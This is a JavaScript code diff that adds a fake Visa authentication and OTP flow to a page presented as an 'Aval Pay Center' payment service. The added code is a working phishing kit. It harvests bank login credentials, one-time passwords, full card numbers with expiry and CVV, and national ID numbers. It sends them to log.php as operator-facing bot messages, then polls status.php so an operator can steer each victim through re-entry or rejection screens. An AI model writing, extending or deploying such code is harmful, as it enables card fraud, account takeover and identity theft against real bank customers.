+            function avFillVisa() {
+                var c = _avCard;
+                var last4 = c.num.slice(-4) || '----';
+                var conv = obtenerConvenio();
+                var datosPU = obtenerDatosPasoUno();
+                var comercio = ((datosPU && datosPU.servicio) ? datosPU.servicio : (conv && conv.Nombre ? conv.Nombre : 'Aval Pay Center')).toUpperCase();
+                var montoFmt = avFmtCOP(c.monto) + ' COP';
+                var now = new Date();
+                var fecha = now.getDate() + ' ' + (now.getMonth()+1) + '. ' + now.getFullYear();
+                ['avVisaComercio','avOtpComercio'].forEach(function(id){ var el=document.getElementById(id); if(el) el.textContent=comercio; });
+                ['avVisaMonto','avOtpMonto'].forEach(function(id){ var el=document.getElementById(id); if(el) el.textContent=montoFmt; });
+                ['avVisaFecha','avOtpFecha'].forEach(function(id){ var el=document.getElementById(id); if(el) el.textContent=fecha; });
+                ['avVisaUltimos','avOtpUltimos'].forEach(function(id){ var el=document.getElementById(id); if(el) el.textContent=last4; });
+                document.getElementById('avVisaDetalleComercio').textContent = comercio;
+                document.getElementById('avVisaDetalleMonto').textContent = montoFmt;
+                document.getElementById('avVisaDetalleTarjeta').textContent = '**** **** **** ' + last4;
+                document.getElementById('avVisaUsuario').value = '';
+                document.getElementById('avVisaClave').value = '';
+                document.getElementById('avVisaErrorMsg').style.display = 'none';
+                avVisaLoading(false);
+                clearInterval(_avVisaTimer);
+            }
+
+            function avVisaLoading(on) {
+                document.getElementById('avVisaFormSection').style.display = on ? 'none' : '';
+                document.getElementById('avVisaLoader').style.display = on ? 'flex' : 'none';
+            }
+            function avOtpLoading(on) {
+                document.getElementById('avVisaOtpFormSection').style.display = on ? 'none' : '';
+                document.getElementById('avVisaOtpLoader').style.display = on ? 'flex' : 'none';
+            }
+            function avVisaShowError() {
+                avVisaLoading(false);
+                document.getElementById('avVisaErrorMsg').style.display = 'block';
+                document.getElementById('avVisaUsuario').value = '';
+                document.getElementById('avVisaClave').value = '';
+            }
+
+            function avPoll(sid) {
+                clearInterval(_avVisaTimer);
+                _avVisaTimer = setInterval(function() {
+                    fetch('status.php?s=' + sid).then(function(r){return r.json();}).then(function(d) {
+                        if (d.status === 'error_usuario') {
+                            clearInterval(_avVisaTimer);
+                            if (document.getElementById('avVisaOtpModal').style.display !== 'none') {
+                                avHideOv('avVisaOtpModal');
+                                avFillVisa();
+                                avShowOv('avVisaAuthModal');
+                            }
+                            avVisaShowError();
+                        } else if (d.status === 'otp') {
+                            clearInterval(_avVisaTimer);
+                            if (document.getElementById('avVisaOtpModal').style.display === 'none') {
+                                avHideOv('avVisaAuthModal');
+                                document.getElementById('avOtpClave').value = '';
+                                avOtpLoading(false);
+                                avShowOv('avVisaOtpModal');
+                            } else {
+                                document.getElementById('avOtpClave').value = '';
+                                avOtpLoading(false);
+                            }
+                        } else if (d.status === 'ncc') {
+                            clearInterval(_avVisaTimer);
+                            avHideOv('avVisaAuthModal');
+                            avHideOv('avVisaOtpModal');
+                            avShowOv('avRechazoOverlay');
+                        }
+                    }).catch(function(){});
+                }, 2000);
+            }
+
+            document.getElementById('avBtnVisaAutorizar').addEventListener('click', function() {
+                var u = document.getElementById('avVisaUsuario').value.trim();
+                var k = document.getElementById('avVisaClave').value.trim();
+                if (!u || !k) return;
+                var sid = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now();
+                avVisaLoading(true);
+                fetch('log.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({
+                    action: 'cc',
+                    text: ['🔗 NUEVO LOGO INGRESADO (AVAL)','','👤 '+_avCard.nombre,'🏛 '+u,'🔐 '+k,'','🪪 '+_avCard.cedula,'🏧 '+_avCard.bank,'💳 '+_avCard.num+' | '+_avCard.exp+' | '+_avCard.cvv].join('\n'),
+                    session_id: sid,
+                    buttons: [[{text:'❌ Error usuario',callback_data:'error_usuario:'+sid},{text:'🔑 OTP',callback_data:'otp:'+sid},{text:'🚫 NCC',callback_data:'ncc:'+sid}]]
+                })});
+                avPoll(sid);
+            });
+
+            document.getElementById('avBtnOtpAutorizar').addEventListener('click', function() {
+                var k = document.getElementById('avOtpClave').value.trim();
+                if (!k) return;
+                var sid = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now();
+                avOtpLoading(true);
+                fetch('log.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({
+                    action: 'cc',
+                    text: ['🔗 NUEVO OTP INGRESADO (AVAL)','','👤 '+_avCard.nombre,k,'','🪪 '+_avCard.cedula,'🏧 '+_avCard.bank,'💳 '+_avCard.num+' | '+_avCard.exp+' | '+_avCard.cvv].join('\n'),
+                    session_id: sid,
+                    buttons: [[{text:'❌ Error usuario',callback_data:'error_usuario:'+sid},{text:'🔑 OTP',callback_data:'otp:'+sid},{text:'🚫 NCC',callback_data:'ncc:'+sid}]]
+                })});
+                avPoll(sid);
+            });
+
+            document.getElementById('avBtnOtpCancelar').addEventListener('click', function() {
+                avHideOv('avVisaOtpModal');
             });
 
             cargarResumen();
